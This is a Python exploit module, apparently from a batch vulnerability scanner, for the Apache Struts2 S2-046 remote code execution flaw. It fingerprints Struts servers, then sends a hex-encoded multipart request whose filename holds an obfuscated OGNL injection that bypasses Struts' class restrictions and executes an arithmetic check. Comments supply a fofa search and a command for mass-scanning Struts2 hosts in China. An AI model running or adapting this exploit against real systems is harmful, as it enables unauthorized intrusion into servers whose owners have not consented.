# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-11 12:57

from core.data import gLogger
from core.parser.urlparser import UrlParser
from exploit.scripts import BaseScript
from core.myenums import BugLevel, BugType
from core.request.asynchttp import *
import re

# fofa: app="Struts2" && country="CN"

# python3 batch.py -m exploit.scripts.Apache.Struts.S2_046_bypass -cs -fs "app=\"Struts2\" && country=\"CN\""

class Script(BaseScript):
    name = 'Apache Struts2'

    def __init__(self, target):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bug_level = BugLevel.HIGH
        # 类型
        self.bug_type = BugType.RCE
        # 编号
        self.bug_number = 'S2-046'
        # 来源
        self.bug_refer = 'https://cloud.tencent.com/developer/article/2037515'
        # 特定路径判断
        self.detect_path_list = ['?actionErrors=111111111111111111111', '/struts/domTT.css']
        # exec
        self.exec_path_list = ['/']
        # 相关信息
        self.info = '''影响版本: Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10'''

    async def detect(self):
        async with aiohttp.ClientSession() as session:
            url2 = f'http://{self.target}/struts/domTT.css' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}/struts/domTT.css'
            text = await AsyncFetcher.fetch(session=session, url=url2, headers=self.headers, timeout=self.req_timeout)
            if text is not None and 'StrutsTTClass' in text:
                self.flag = True
                gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url2))
                return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url2, 'software': self.name}

            url = f'http://{self.target}/' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}/'
            async with session.get(url=url, headers=self.headers, timeout=self.req_timeout, verify_ssl=False) as response:
                await asyncio.sleep(2)
                text = await response.text()
                re_content = re.search(r'"(.*?\.action)"', text, re.S | re.I)
                if re_content is not None:
                    self.flag = True
                    re_keyword = re_content.group(1)
                    self.exec_path_list.append(f'/{re_keyword}' if not re_keyword.startswith('/') else re_keyword)
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                    return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}
                # target = UrlParser(str(response.url)).url_no_param
                # url2 = f'http://{target}?actionErrors=111111111111111111111' if self.target.startswith(('http:', 'https:')) is False else f'{target}?actionErrors=111111111111111111111'
                # async with session.get(url=url2, headers=self.headers, timeout=self.req_timeout, verify_ssl=False, allow_redirects=False) as response2:
                #     await asyncio.sleep(2)
                #     text2 = await response.text()
                #     response2_status = response2.status
                #     if text2 is not None and (response2_status == 404 or response2_status == 500 or response2_status == 302 or '111111111111111111111' in text2):
                #         self.flag = True
                #         gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url2))
                #         return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url2, 'software': self.name}


    async def exec(self):
        headers = self.headers.copy()
        headers.update({'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryAnmUgTEhFhOZpr9z'})
        for exec_path in self.exec_path_list:
            async with aiohttp.ClientSession() as session:
                url = f'http://{self.target}{exec_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{exec_path}'
                data = bytes.fromhex('2d2d2d2d2d2d5765624b6974466f726d426f756e64617279416e6d556754456846684f5a7072397a0d0a436f6e74656e742d446973706f736974696f6e3a20666f726d2d646174613b206e616d653d2274657374223b2066696c656e616d653d22732e257b2823646d3d405c7530303666676e6c2e4f676e6c435c75303036666e74657874404445465c7530303431554c545f4d454d4245525f5c75303034314343455353292e28235f6d656d6265725c753030343163636573733f28235f6d656d6265725c753030343163636573733d23646d293a282823635c75303036666e7461696e65723d23635c75303036666e746578745b27635c75303036666d2e5c753030366670656e73796d70685c75303036666e792e78775c7530303666726b322e5c75303034316374695c75303036666e435c75303036666e746578742e635c75303036666e7461696e6572275d292e28235c7530303666676e6c5574696c3d23635c75303036666e7461696e65722e676574496e7374616e63652840635c75303036666d2e5c753030366670656e73796d70685c75303036666e792e78775c7530303666726b322e5c7530303666676e6c2e4f676e6c5574696c40636c61737329292e28235c7530303666676e6c5574696c2e6765744578636c756465645061636b6167654e616d657328292e636c6561722829292e28235c7530303666676e6c5574696c2e6765744578636c75646564436c617373657328292e636c6561722829292e2823635c75303036666e746578742e7365744d656d6265725c753030343163636573732823646d292929292e2823725c7530303666733d28405c753030366672672e6170616368652e737472757473322e536572766c65745c75303034316374695c75303036666e435c75303036666e7465787440676574526573705c75303036666e736528292e676574577269746572282929292e2823725c7530303666732e7072696e7428313131312a3131313129292e2823725c7530303666732e666c7573682829292e2823725c7530303666732e636c5c753030366673652829297d0062220d0a436f6e74656e742d547970653a206170706c69636174696f6e2f6f637465742d73747265616d0d0a0d0a7878780d0a2d2d2d2d2d2d5765624b6974466f726d426f756e64617279416e6d556754456846684f5a7072397a2d2d0d0a0d0a0d')
                text = await AsyncFetcher.post_fetch(session=session, url=url, data=data, headers=headers, timeout=self.req_timeout)
                if text is not None and '1234321' in text:
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, self.bug_type, url))
                    return {'name': '{} {}'.format(self.name, self.bug_type), 'url': url, 'software': self.name}


if __name__ == '__main__':
    pass
